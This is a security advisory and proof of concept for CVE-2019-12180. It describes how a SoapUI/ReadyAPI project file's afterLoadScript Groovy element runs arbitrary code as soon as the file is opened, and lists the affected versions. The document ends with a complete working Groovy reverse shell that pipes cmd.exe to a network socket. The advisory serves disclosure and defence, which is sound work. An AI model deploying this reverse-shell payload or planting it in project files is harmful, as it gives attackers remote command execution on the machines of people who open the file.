# CVE-2019-12180
Advisory & PoC

SoapUI and ReadyAPI allow you to create or add dynamic contents to test cases
(for example, to calculate a timestamp on the fly) using Apache Groovy Language
scripts. Execution of these scripts can be triggered in many ways and they are
stored inside the XML "Project file" once a project is saved. 

The "Load Script" function allows to create a Groovy script that is launched
once the project file is opened (con:afterLoadScript element of the XML Project
file) without any further user interaction. This behavior can be abused by an
attacker to create malicious project files that, once opened, execute arbitrary
Groovy code on the victim system. Since it is possible to execute system
commands using the Groovy language, this feature can be abused to execute
remote commands effectively.

NOTE: the same goal can be achieved by exploiting any other Groovy script capable
function ("Save script" for example), but this will require additional user
interaction after loading the project file.


Vulnerable Application: 
 - ReadyAPI 3.0.0
 - 2.8.2 and earlier
 - SoapUI 5.5 and earlier

<b>At the time of writing (2020-02-04), this is a 0day vulnerability, since 
(multiple) proposed disclosure dates have passed with no patch release by the
vendor. </b>

Example Groovy Reverse shell (https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76):

<code>

String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
</code>
